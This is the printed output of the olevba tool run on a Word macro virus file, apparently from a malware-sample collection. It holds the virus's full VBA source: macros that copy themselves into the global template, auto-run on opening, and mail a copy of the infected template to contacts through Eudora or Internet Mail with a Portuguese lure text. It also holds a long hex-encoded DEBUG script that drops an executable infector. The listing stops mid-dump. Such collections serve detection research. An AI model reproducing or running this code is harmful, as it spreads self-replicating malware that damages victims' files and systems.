@@ -1,0 +1,849 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Tamago.e
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO ArquivoImprimir.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/ArquivoImprimir'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArquivoImprimir.MAIN"
+WordBasic.Call "ImpreArq"  'possibly insert text.
+Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)     'declare dialog of type FilePrint
+WordBasic.CurValues.FilePrint dlg
+WordBasic.Dialog.FilePrint dlg      'executa dialogo de impressão
+WordBasic.FilePrint dlg       'perform actions from dialog.
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Infec.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/Infec'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Infec.MAIN"
+Dim caminho$
+caminho$ = Environ("LEGADO")
+If caminho$ = "NOWAY" Then GoTo NoWay
+On Error GoTo -1: On Error GoTo NoWay
+On Error GoTo -1: On Error GoTo AutoExec
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Infec", "Global:Infec", 1
+AutoExec:
+On Error GoTo -1: On Error GoTo email
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
+email:
+On Error GoTo -1: On Error GoTo libvirus
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":email", "Global:email", 1
+libvirus:
+On Error GoTo -1: On Error GoTo AutoClose
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":libvirus", "Global:libvirus", 1
+AutoClose:
+On Error GoTo -1: On Error GoTo AutoOpen
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose", 1
+AutoOpen:
+On Error GoTo -1: On Error GoTo arqsalcomo
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
+arqsalcomo:
+On Error GoTo -1: On Error GoTo arqimp
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoSalvarComo", "Global:ArquivoSalvarComo", 1
+arqimp:
+On Error GoTo -1: On Error GoTo arqimppad
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimir", "Global:ArquivoImprimir", 1
+arqimppad:
+On Error GoTo -1: On Error GoTo imparq
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão", "Global:ArquivoImprimirPadrão", 1
+imparq:
+On Error GoTo -1: On Error GoTo destruct
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ImpreArq", "Global:ImpreArq", 1
+destruct:
+On Error GoTo -1: On Error GoTo NoWay
+WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Destruct", "Global:Destruct", 1
+NoWay:
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO AutoExec.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/AutoExec'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
+WordBasic.Call "Infec"
+WordBasic.Call "email"
+WordBasic.Call "libvirus"
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO email.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/email'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.email.MAIN"
+Dim versao$
+Dim so$
+Dim normal$
+Dim nome$
+Dim T
+Dim tecla
+On Error GoTo -1: On Error GoTo NoWay
+versao$ = WordBasic.[GetSystemInfo$](24)
+so$ = WordBasic.[GetSystemInfo$](21)
+normal$ = ""
+nome$ = "c:\precos.doc"
+If WordBasic.[Files$](nome$) <> "" Then WordBasic.Kill nome$
+If WordBasic.[Files$]("c:\winword\modelos\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\winword\modelos\normal.dot")
+If WordBasic.[Files$]("c:\winword\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\winword\normal.dot")
+If WordBasic.[Files$]("c:\msoffice\modelos\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\msoffice\modelos\normal.dot")
+If WordBasic.[Files$]("c:\msoffice\models\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\msoffice\models\normal.dot")
+If WordBasic.[Files$]("normal.dot") <> "" Then normal$ = WordBasic.[Files$]("normal.dot")
+If WordBasic.[Files$]("modelos\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("modelos\normal.dot")
+
+If normal$ = "" Then GoTo NoWay
+WordBasic.CopyFile normal$, "c:\"
+WordBasic.Rename "c:\Normal.", nome$
+
+If WordBasic.AppIsRunning("Eudora") Then
+    WordBasic.AppShow "Eudora Light"
+Rem     AplAtivar "Eudora"
+    GoTo eudora
+End If
+If WordBasic.AppIsRunning("Internet Mail") Then GoTo Win95
+If WordBasic.[Files$]("C:\eudora\eudora.exe") <> "" Then
+WordBasic.Shell WordBasic.[Files$]("C:\eudora\eudora.exe"), 1
+GoTo eudora
+End If
+
+If WordBasic.[Files$]("C:\arquivos de programas\eudora\eudora.exe") <> "" Then
+WordBasic.Shell WordBasic.[Files$]("C:\arquivos de programas\eudora\eudora.exe"), 1
+GoTo eudora
+End If
+If WordBasic.[Files$]("C:\Program Files\eudora\eudora.exe") <> "" Then
+WordBasic.Shell WordBasic.[Files$]("C:\Program Files\eudora\eudora.exe"), 1
+GoTo eudora
+End If
+
+If so$ = "Windows" Then GoTo Windows
+GoTo NoWay
+Windows:
+If (versao$ >= "3") And (versao$ < "4.0") Then GoTo Win311
+If WordBasic.AppIsRunning("Internet Mail") Then GoTo Win95
+GoTo NoWay
+Win311:
+If WordBasic.AppIsRunning("Mail") Then
+    WordBasic.AppActivate "Mail"
+Else
+WordBasic.MicrosoftMail
+WordBasic.SendKeys "{enter 3}", -1
+End If
+On Error GoTo -1: On Error GoTo NoWay
+WordBasic.SendKeys "^r", -1
+WordBasic.AppHide "Mensagem"
+WordBasic.SendKeys "%d", -1
+WordBasic.AppHide "Endereços"
+WordBasic.SendKeys "+^{end}", -1
+WordBasic.SendKeys "%p", -1
+WordBasic.SendKeys "{enter}", -1
+WordBasic.SendKeys "{tab 2}Sente só:{tab}", -1
+WordBasic.SendKeys " Oi,{enter 2}Estou te enviando uma lista ", -1
+WordBasic.SendKeys "sobre precos de programas para ", -1
+WordBasic.SendKeys "PC, de uma olhada nela, falo ", -1
+WordBasic.SendKeys "com voce mais tarde, eu tenho que ", -1
+WordBasic.SendKeys "ir para a escola, a empregada nao veio ", -1
+WordBasic.SendKeys "e eu tenho que me virar. Tchau.%r", -1
+WordBasic.SendKeys nome$, -1
+WordBasic.SendKeys "{enter}%f%n%j1", -1
+WordBasic.SendKeys "{home}+^{end}{del 2}%{f4}"
+'WordBasic.SendKeys T = tecla "{tab}{enter}", - 1
+WordBasic.Kill nome$
+Win95:
+WordBasic.AppShow "Internet mail"
+WordBasic.AppHide "Internet mail"
+WordBasic.SendKeys "^n", -1
+If WordBasic.AppIsRunning("Nova Messagem") Then
+    GoTo Portugues
+Else
+    If WordBasic.AppIsRunning("New Message") Then GoTo Ingles
+End If
+GoTo NoWay
+Ingles:
+WordBasic.AppHide "New message"
+WordBasic.SendKeys "%m", -1
+WordBasic.SendKeys "r+^{end}", -1
+WordBasic.SendKeys "%o", -1
+WordBasic.SendKeys "{tab 7}{enter}{tab 2}", -1
+WordBasic.SendKeys "^{home}Sente só:{tab}", -1
+WordBasic.SendKeys " ^{home}{enter}^{home}Oi,{enter 2}Estou", -1
+WordBasic.SendKeys " te enviando uma lista", -1
+WordBasic.SendKeys " sobre precos de programas e", -1
+WordBasic.SendKeys " jogos para o ", -1
+WordBasic.SendKeys "PC, de uma olhada nela, falo ", -1
+WordBasic.SendKeys "com voce mais tarde, eu tenho que", -1
+WordBasic.SendKeys " ir para a escola, a empregada nao veio ", -1
+WordBasic.SendKeys "e eu tenho que me virar. Tchau.{enter}%if", -1
+WordBasic.AppHide "Insert Atta"
+WordBasic.SendKeys nome$, -1
+WordBasic.SendKeys "{enter}%s^m", -1
+Rem EnviarTeclas "{home}+^{end}{del}%{f4}^m", - 1
+WordBasic.AppHide "Sending and Receiving"
+WordBasic.AppHide "Internet Mail"
+WordBasic.AppShow "Microsoft Word"
+GoTo NoWay
+Portugues:
+Rem AplAtivar "Internet mail"
+WordBasic.AppHide "Internet mail"
+Rem EnviarTeclas("^n"), - 1
+WordBasic.AppHide "Nova mensagem"
+WordBasic.SendKeys "%m", -1
+WordBasic.SendKeys "r+^{end}", -1
+WordBasic.SendKeys "%p", -1
+WordBasic.SendKeys "{tab 7}{enter}{tab 2}", -1
+WordBasic.SendKeys "Sente só:{tab}", -1
+WordBasic.SendKeys " ^{home}{enter}^{home}Oi,{enter 2}Estou", -1
+WordBasic.SendKeys " te enviando uma lista", -1
+WordBasic.SendKeys " sobre precos de programas e", -1
+WordBasic.SendKeys " jogos para o ", -1
+WordBasic.SendKeys "PC, de uma olhada nela, falo ", -1
+WordBasic.SendKeys "com voce mais tarde, eu tenho que", -1
+WordBasic.SendKeys " ir para a escola, a empregada nao veio ", -1
+WordBasic.SendKeys "e eu tenho que me virar. Tchau.{enter}%ia", -1
+WordBasic.AppHide "Insira"
+WordBasic.SendKeys nome$, -1
+WordBasic.SendKeys "{enter}%e^m", -1
+Rem EnviarTeclas "{home}+^{end}{del}%{f4}^m", - 1
+WordBasic.AppHide "Interner mail"
+WordBasic.AppShow "Microsoft Word"
+GoTo NoWay
+eudora:
+WordBasic.AppHide "Eudora Light"
+WordBasic.SendKeys "{esc 2}", -1
+WordBasic.SendKeys "^n^l{home}+^{end}%t", -1
+WordBasic.SendKeys "{tab}Sente só:{tab 3}", -1
+WordBasic.SendKeys "Oi,{enter 2}Estou te enviando uma lista", -1
+WordBasic.SendKeys " sobre preços de programas e", -1
+WordBasic.SendKeys " jogos para o ", -1
+WordBasic.SendKeys "PC, dê uma olhada nela, falo ", -1
+WordBasic.SendKeys "com voce outra hora, eu tenho que", -1
+WordBasic.SendKeys " ir para a escola, a empregada nao veio ", -1
+WordBasic.SendKeys "e eu tive que me virar sozinho. Tchau.{enter}^h", -1
+WordBasic.AppHide "Attach"
+WordBasic.SendKeys nome$, -1
+WordBasic.SendKeys "{enter}^e^t", -1
+WordBasic.AppHide "progress"
+WordBasic.AppHide "eudora Light"
+Rem EnviarTeclas "{enter}", - 1
+WordBasic.AppShow "Microsoft Word"
+NoWay:
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO libvirus.bas 
+in file: Virus.MSWord.Tamago.e - OLE stream: 'Macros/VBA/libvirus'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Sub MAIN()
+Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
+Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.libvirus.MAIN"
+Dim caminho$
+'Is is 5PM ? - approx time before work is finished.
+caminho$ = Environ("LEGADO")
+If caminho$ = "NOWAY" Then GoTo NoDropper
+If WordBasic.Hour(WordBasic.Now()) < 5 + 12 Then
+    GoTo NoDropper
+End If
+On Error GoTo -1: On Error GoTo NoDropper
+Open "C:\legado.SCR" For Output As 1    'dump script.
+Print #1, "N c:\dos\legado.com"
+Print #1, "E 0100 4D 5A 60 00 10 00 70 00 1E 00 E0 02 E0 02 58 02"
+Print #1, "E 0110 00 25 00 00 54 08 00 00 1C 00 00 00 2D 00 00 00"
+Print #1, "E 0120 3C 00 00 00 4C 00 00 00 5E 00 00 00 8D 00 00 00"
+Print #1, "E 0130 E6 00 00 00 F5 00 00 00 04 01 00 00 13 01 00 00"
+Print #1, "E 0140 26 01 00 00 31 01 00 00 6B 01 00 00 79 01 00 00"
+Print #1, "E 0150 93 01 00 00 BB 01 00 00 22 02 00 00 37 02 00 00"
+Print #1, "E 0160 56 02 00 00 64 02 00 00 73 02 00 00 81 02 00 00"
+Print #1, "E 0170 9B 02 00 00 B5 02 00 00 D0 02 00 00 DA 02 00 00"
+Print #1, "E 0180 E9 02 00 00 F7 02 00 00 07 03 00 00 15 03 00 00"
+Print #1, "E 0190 2F 03 00 00 49 03 00 00 53 03 00 00 5D 03 00 00"
+Print #1, "E 01A0 6C 03 00 00 7A 03 00 00 8A 03 00 00 98 03 00 00"
+Print #1, "E 01B0 A9 03 00 00 C3 03 00 00 DD 03 00 00 F8 03 00 00"
+Print #1, "E 01C0 02 04 00 00 0C 04 00 00 5C 04 00 00 84 04 00 00"
+Print #1, "E 01D0 8E 04 00 00 B2 04 00 00 BC 04 00 00 CE 04 00 00"
+Print #1, "E 01E0 FA 04 00 00 08 05 00 00 19 05 00 00 29 05 00 00"
+Print #1, "E 01F0 38 05 00 00 52 05 00 00 6D 05 00 00 88 05 00 00"
+Print #1, "E 0200 93 05 00 00 A7 05 00 00 B1 05 00 00 C0 05 00 00"
+Print #1, "E 0210 C5 05 00 00 CF 05 00 00 DE 05 00 00 E3 05 00 00"
+Print #1, "E 0220 E8 05 00 00 F7 05 00 00 02 06 00 00 0D 06 00 00"
+Print #1, "E 0230 5D 06 00 00 99 06 00 00 A4 06 00 00 B4 06 00 00"
+Print #1, "E 0240 BF 06 00 00 CF 06 00 00 DA 06 00 00 FF 06 00 00"
+Print #1, "E 0250 0F 07 00 00 1E 07 00 00 5C 07 00 00 6F 07 00 00"
+Print #1, "E 0260 74 07 00 00 83 07 00 00 96 07 00 00 A0 07 00 00"
+Print #1, "E 0270 B1 07 00 00 BB 07 00 00 D0 07 00 00 DA 07 00 00"
+Print #1, "E 0280 EB 07 00 00 F5 07 00 00 57 08 00 00 5C 08 00 00"
+Print #1, "E 0290 73 08 00 00 7D 08 00 00 86 08 00 00 94 08 00 00"
+Print #1, "E 02A0 A2 08 00 00 AA 08 00 00 C0 08 00 00 BE 02 8D 00"
+Print #1, "E 02B0 09 00 BF 00 24 00 BF 00 37 00 BF 00 3B 01 BF 00"
+Print #1, "E 02C0 01 00 21 01 1B 01 21 01 B5 02 21 01 45 09 21 01"
+Print #1, "E 02D0 60 09 21 01 76 09 21 01 95 09 21 01 00 00 00 00"
+Print #1, "E 02E0 55 89 E5 81 EC 80 01 8C D3 8E C3 8C DB FC 8D BE"
+Print #1, "E 02F0 00 FF C5 76 06 AC AA 91 30 ED F3 A4 8E DB 8D BE"
+Print #1, "E 0300 80 FE 16 57 8D BE 00 FF 16 57 9A 3F 04 21 01 8D"
+Print #1, "E 0310 BE 80 FE 16 57 B8 80 00 50 9A 7A 04 21 01 8D BE"
+Print #1, "E 0320 80 FE 16 57 BF 72 06 1E 57 9A 93 00 8D 00 FF 36"
+Print #1, "E 0330 74 06 FF 36 72 06 BF 66 06 1E 57 9A 55 01 8D 00"
+Print #1, "E 0340 A1 6C 06 A3 58 06 A1 6E 06 A3 5A 06 A1 70 06 A3"
+Print #1, "E 0350 5C 06 A1 6A 06 A3 60 06 A1 68 06 A3 62 06 A1 66"
+Print #1, "E 0360 06 A3 64 06 8D BE 80 FE 16 57 9A FB 04 21 01 89"
+Print #1, "E 0370 EC 5D CA 04 00 55 89 E5 81 EC 80 01 8C D3 8E C3"
+Print #1, "E 0380 8C DB FC 8D BE 00 FF C5 76 06 AC AA 91 30 ED F3"
+Print #1, "E 0390 A4 8E DB A1 58 06 A3 6C 06 A1 5A 06 A3 6E 06 A1"
+Print #1, "E 03A0 5C 06 A3 70 06 A1 60 06 A3 6A 06 A1 62 06 A3 68"
+Print #1, "E 03B0 06 A1 64 06 A3 66 06 8D BE 80 FE 16 57 8D BE 00"
+Print #1, "E 03C0 FF 16 57 9A 3F 04 21 01 8D BE 80 FE 16 57 B8 80"
+Print #1, "E 03D0 00 50 9A 7A 04 21 01 BF 66 06 1E 57 BF 72 06 1E"
+Print #1, "E 03E0 57 9A 99 01 8D 00 8D BE 80 FE 16 57 B8 80 00 50"
+Print #1, "E 03F0 9A 7A 04 21 01 8D BE 80 FE 16 57 FF 36 74 06 FF"
+Print #1, "E 0400 36 72 06 9A BA 00 8D 00 8D BE 80 FE 16 57 9A FB"
+Print #1, "E 0410 04 21 01 89 EC 5D CA 04 00 55 89 E5 81 EC 10 01"
+Print #1, "E 0420 8C D3 8E C3 8C DB FC 8D BE FE FE C5 76 06 AC AA"
+Print #1, "E 0430 91 30 ED F3 A4 8E DB C7 86 F0 FE 01 00 BF D6 00"
+Print #1, "E 0440 1E 57 8D BE FE FE 16 57 9A 3F 04 21 01 BF D6 00"
+Print #1, "E 0450 1E 57 B8 01 00 50 9A 7A 04 21 01 BF D6 00 1E 57"
+Print #1, "E 0460 8D BE F4 FE 16 57 B8 0A 00 50 8D BE F2 FE 16 57"
+Print #1, "E 0470 9A 65 05 21 01 8A 86 F6 FE 3A 06 05 00 75 10 8A"
+Print #1, "E 0480 86 F7 FE 3A 06 06 00 75 06 C6 46 FF 01 EB 04 C6"
+Print #1, "E 0490 46 FF 00 BF D6 00 1E 57 9A FB 04 21 01 8A 46 FF"
+Print #1, "E 04A0 89 EC 5D CA 04 00 0B 56 49 52 54 45 4D 50 2E 54"
+Print #1, "E 04B0 4D 50 0B 43 4F 4D 4D 41 4E 44 2E 43 4F 4D 0B 76"
+Print #1, "E 04C0 69 72 74 65 6D 70 2E 74 6D 70 0B 76 69 72 74 65"
+Print #1, "E 04D0 6D 70 2E 54 4D 50 55 89 E5 81 EC 64 27 8C D3 8E"
+Print #1, "E 04E0 C3 8C DB FC 8D BE 00 FF C5 76 06 AC AA 91 30 ED"
+Print #1, "E 04F0 F3 A4 8E DB 8D BE 00 FF 16 57 BF C6 01 0E 57 9A"
+Print #1, "E 0500 EA 07 21 01 75 03 E9 EF 01 8D BE 00 FF 16 57 BF"
+Print #1, "E 0510 D2 01 0E 57 9A EA 07 21 01 75 03 E9 DA 01 8D BE"
+Print #1, "E 0520 00 FF 16 57 0E E8 B8 FD BF 56 01 1E 57 8D BE 00"
+Print #1, "E 0530 FF 16 57 9A 3F 04 21 01 BF 56 01 1E 57 B8 01 00"
+Print #1, "E 0540 50 9A 7A 04 21 01 BF D6 01 1E 57 BF DE 01 0E 57"
+Print #1, "E 0550 9A 3F 04 21 01 BF D6 01 1E 57 B8 01 00 50 9A 83"
+Print #1, "E 0560 04 21 01 BF 56 01 1E 57 8D BE A0 D8 16 57 B8 00"
+Print #1, "E 0570 08 50 8D BE 9E D8 16 57 9A 65 05 21 01 BF D6 01"
+Print #1, "E 0580 1E 57 8D BE A0 D8 16 57 FF B6 9E D8 8D BE 9C D8"
+Print #1, "E 0590 16 57 9A 6C 05 21 01 83 BE 9E D8 00 74 0A 8B 86"
+Print #1, "E 05A0 9C D8 3B 86 9E D8 74 BB BF 56 01 1E 57 9A FB 04"
+Print #1, "E 05B0 21 01 BF D6 01 1E 57 9A FB 04 21 01 BF 56 01 1E"
+Print #1, "E 05C0 57 BF 76 06 1E 57 9A 3F 04 21 01 BF 56 01 1E 57"
+Print #1, "E 05D0 B8 01 00 50 9A 7A 04 21 01 BF D6 01 1E 57 8D BE"
+Print #1, "E 05E0 00 FF 16 57 9A 3F 04 21 01 BF D6 01 1E 57 B8 01"
+Print #1, "E 05F0 00 50 9A 83 04 21 01 BF 56 01 1E 57 8D BE A0 E0"
+Print #1, "E 0600 16 57 B8 60 1E 50 8D BE 9E D8 16 57 9A 65 05 21"
+Print #1, "E 0610 01 BF D6 01 1E 57 8D BE A0 E0 16 57 FF B6 9E D8"
+Print #1, "E 0620 8D BE 9C D8 16 57 9A 6C 05 21 01 BF 56 01 1E 57"
+Print #1, "E 0630 9A FB 04 21 01 BF D6 01 1E 57 9A FB 04 21 01 BF"
+Print #1, "E 0640 56 01 1E 57 BF EA 01 0E 57 9A 3F 04 21 01 BF 56"
+Print #1, "E 0650 01 1E 57 B8 01 00 50 9A 7A 04 21 01 BF D6 01 1E"
+Print #1, "E 0660 57 8D BE 00 FF 16 57 9A 3F 04 21 01 BF D6 01 1E"
+Print #1, "E 0670 57 B8 01 00 50 9A 7A 04 21 01 BF D6 01 1E 57 B8"
+Print #1, "E 0680 60 1E 31 D2 52 50 9A CD 05 21 01 BF 56 01 1E 57"
+Print #1, "E 0690 8D BE A0 E0 16 57 B8 60 1E 50 8D BE 9E D8 16 57"
+Print #1, "E 06A0 9A 65 05 21 01 BF D6 01 1E 57 8D BE A0 E0 16 57"
+Print #1, "E 06B0 FF B6 9E D8 8D BE 9C D8 16 57 9A 6C 05 21 01 83"
+Print #1, "E 06C0 BE 9E D8 00 74 0A 8B 86 9C D8 3B 86 9E D8 74 BB"
+Print #1, "E 06D0 BF 56 01 1E 57 9A FB 04 21 01 BF D6 01 1E 57 9A"
+Print #1, "E 06E0 FB 04 21 01 BF 56 01 1E 57 9A FD 05 21 01 8D BE"
+Print #1, "E 06F0 00 FF 16 57 0E E8 7D FC 89 EC 5D CA 04 00 55 89"
+Print #1, "E 0700 E5 81 EC 00 04 8C D3 8E C3 8C DB FC 8D BE 00 FF"
+Print #1, "E 0710 C5 76 0A AC AA 91 30 ED F3 A4 8D BE 00 FE C5 76"
+Print #1, "E 0720 06 AC AA 91 30 ED F3 A4 8E DB 8D BE 00 FF 16 57"
+Print #1, "E 0730 B8 20 00 50 BF C8 06 1E 57 9A D9 00 8D 00 83 3E"
+Print #1, "E 0740 F4 06 00 75 6D 83 3E C6 06 28 7D 66 80 3E E6 06"
+Print #1, "E 0750 00 75 02 EB 5D 8D BE 00 FD 16 57 8D BE 00 FE 16"
+Print #1, "E 0760 57 9A F9 06 21 01 BF E6 06 1E 57 9A 78 07 21 01"
+Print #1, "E 0770 0E E8 A5 FC 08 C0 75 2E FF 06 C6 06 83 3E C6 06"
+Print #1, "E 0780 28 7D 21 8D BE 00 FC 16 57 8D BE 00 FE 16 57 9A"
+Print #1, "E 0790 F9 06 21 01 BF E6 06 1E 57 9A 78 07 21 01 0E E8"
+Print #1, "E 07A0 34 FD EB 02 EB 0C BF C8 06 1E 57 9A 17 01 8D 00"
+Print #1, "E 07B0 EB 8C 89 EC 5D CA 08 00 0B 76 69 72 74 65 6D 70"
+Print #1, "E 07C0 2E 74 6D 70 01 20 55 89 E5 81 EC 04 0C 8D 7E 80"
+Print #1, "E 07D0 16 57 BF 76 06 1E 57 9A 3F 04 21 01 8D 7E 80 16"
+Print #1, "E 07E0 57 B8 01 00 50 9A 7A 04 21 01 8D 7E 80 16 57 B8"
+Print #1, "E 07F0 60 1E 31 D2 52 50 9A CD 05 21 01 8D BE 00 FF 16"
+Print #1, "E 0800 57 BF D8 04 0E 57 9A 3F 04 21 01 8D BE 00 FF 16"
+Print #1, "E 0810 57 B8 01 00 50 9A 83 04 21 01 8D 7E 80 16 57 8D"
+Print #1, "E 0820 BE FC F6 16 57 B8 00 08 50 8D BE FE FE 16 57 9A"
+Print #1, "E 0830 65 05 21 01 8D BE 00 FF 16 57 8D BE FC F6 16 57"
+Print #1, "E 0840 FF B6 FE FE 8D BE FC FE 16 57 9A 6C 05 21 01 83"
+Print #1, "E 0850 BE FE FE 00 74 0A 8B 86 FC FE 3B 86 FE FE 74 BA"
+Print #1, "E 0860 8D 7E 80 16 57 9A FB 04 21 01 8D BE 00 FF 16 57"
+Print #1, "E 0870 9A FB 04 21 01 BF D8 04 0E 57 8D BE FC F5 16 57"
+Print #1, "E 0880 B8 01 00 50 9A 71 06 21 01 BF E4 04 0E 57 9A 78"
+Print #1, "E 0890 07 21 01 8D BE FC F4 16 57 B8 02 00 50 9A 71 06"
+Print #1, "E 08A0 21 01 9A 78 07 21 01 BF E4 04 0E 57 9A 78 07 21"
+Print #1, "E 08B0 01 8D BE FC F3 16 57 B8 03 00 50 9A 71 06 21 01"
+Print #1, "E 08C0 9A 78 07 21 01 9A 3F 02 8D 00 8D BE 00 FF 16 57"
+Print #1, "E 08D0 B8 80 00 50 9A 83 04 21 01 8D BE 00 FF 16 57 9A"
+Print #1, "E 08E0 FB 04 21 01 8D BE 00 FF 16 57 9A FD 05 21 01 89"
+Print #1, "E 08F0 EC 5D CB 0E 63 3A 5C 63 6F 6D 6D 61 6E 64 2E 63"
+Print #1, "E 0900 6F 6D 09 63 3A 5C 69 6F 2E 73 79 73 12 63 3A 5C"
+Print #1, "E 0910 77 69 6E 64 6F 77 73 5C 77 69 6E 2E 63 6F 6D 55"
+Print #1, "E 0920 89 E5 81 EC 8A 00 8D 7E FA 16 57 8D 7E FE 16 57"
+Print #1, "E 0930 8D 7E FC 16 57 8D 7E F8 16 57 9A 00 00 8D 00 C6"
+Print #1, "E 0940 46 F7 00 81 7E FA CE 07 75 10 83 7E FE 07 72 0A"
+Print #1, "E 0950 83 7E FC 0C 72 04 C6 46 F7 01 81 7E FA CE 07 76"
+Print #1, "E 0960 04 C6 46 F7 01 80 7E F7 00 74 51 8D BE 76 FF 16"
+Print #1, "E 0970 57 BF 13 06 0E 57 9A 3F 04 21 01 8D BE 76 FF 16"
+Print #1, "E 0980 57 9A FD 05 21 01 8D BE 76 FF 16 57 BF 22 06 0E"
+Print #1, "E 0990 57 9A 3F 04 21 01 8D BE 76 FF 16 57 9A FD 05 21"
+Print #1, "E 09A0 01 8D BE 76 FF 16 57 BF 2C 06 0E 57 9A 3F 04 21"
+Print #1, "E 09B0 01 8D BE 76 FF 16 57 9A FD 05 21 01 89 EC 5D CB"
+Print #1, "E 09C0 04 50 41 54 48 06 5C 2A 2E 63 6F 6D 01 5C 06 5C"
+Print #1, "E 09D0 2A 2E 65 78 65 55 89 E5 81 EC 04 04 9A D8 02 8D"
+Print #1, "E 09E0 00 8D BE FE FC 16 57 BF E0 06 0E 57 9A D1 01 8D"
+Print #1, "E 09F0 00 8D BE FE FD 16 57 B8 FF 00 50 9A 13 07 21 01"
+Print #1, "E 0A00 C6 86 FE FE 00 8A 86 FE FD 30 E4 89 86 FC FD B8"
+Print #1, "E 0A10 01 00 3B 86 FC FD 7E 03 E9 D1 00 89 46 FE EB 03"
+Print #1, "E 0A20 FF 46 FE 8B 7E FE 80 BB FE FD 3B 74 3A 8D BE FC"
+Print #1, "E 0A30 FB 16 57 8D BE FE FE 16 57 9A F9 06 21 01 8D BE"
+Print #1, "E 0A40 FC FC 16 57 8B 7E FE 8A 83 FE FD 50 9A 15 08 21"
+Print #1, "E 0A50 01 9A 78 07 21 01 8D BE FE FE 16 57 B8 FF 00 50"
+Print #1, "E 0A60 9A 13 07 21 01 EB 79 8D BE FC FC 16 57 8D BE FE"
+Print #1, "E 0A70 FE 16 57 9A F9 06 21 01 BF E5 06 0E 57 9A 78 07"
+Print #1, "E 0A80 21 01 8D BE FC FB 16 57 8D BE FE FE 16 57 9A F9"
+Print #1, "E 0A90 06 21 01 BF EC 06 0E 57 9A 78 07 21 01 0E E8 5D"
+Print #1, "E 0AA0 FC 8D BE FC FC 16 57 8D BE FE FE 16 57 9A F9 06"
+Print #1, "E 0AB0 21 01 BF EE 06 0E 57 9A 78 07 21 01 8D BE FC FB"
+Print #1, "E 0AC0 16 57 8D BE FE FE 16 57 9A F9 06 21 01 BF EC 06"
+Print #1, "E 0AD0 0E 57 9A 78 07 21 01 0E E8 23 FC C6 86 FE FE 00"
+Print #1, "E 0AE0 8B 46 FE 3B 86 FC FD 74 03 E9 34 FF 89 EC 5D CB"
+Print #1, "E 0AF0 05 2A 2E 63 6F 6D 00 05 2A 2E 65 78 65 55 89 E5"
+Print #1, "E 0B00 31 C0 A3 C6 06 BF 10 08 0E 57 BF 16 08 0E 57 0E"
+Print #1, "E 0B10 E8 EB FB BF 17 08 0E 57 BF 16 08 0E 57 0E E8 DD"
+Print #1, "E 0B20 FB 0E E8 B0 FE 5D CB 06 4C 45 47 41 44 4F 05 4E"
+Print #1, "E 0B30 4F 57 41 59 9A 00 00 21 01 9A 0D 00 BF 00 55 89"
+Print #1, "E 0B40 E5 81 EC 00 01 8D BE 00 FF 16 57 BF 47 08 0E 57"
+Print #1, "E 0B50 9A D1 01 8D 00 BF 4E 08 0E 57 9A EA 07 21 01 75"
+Print #1, "E 0B60 07 31 C0 9A 16 01 21 01 8D BE 00 FF 16 57 31 C0"
+Print #1, "E 0B70 50 9A 71 06 21 01 BF 76 06 1E 57 B8 4F 00 50 9A"
+Print #1, "E 0B80 13 07 21 01 B0 00 50 9A 84 00 8D 00 0E E8 6D FF"
+Print #1, "E 0B90 0E E8 32 FC 0E E8 87 FD 89 EC 5D 31 C0 9A 16 01"
+Print #1, "E 0BA0 21 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+Print #1, "E 0BB0 55 8B EC B4 2A CD 21 32 E4 C4 7E 06 AB 8A C2 C4"
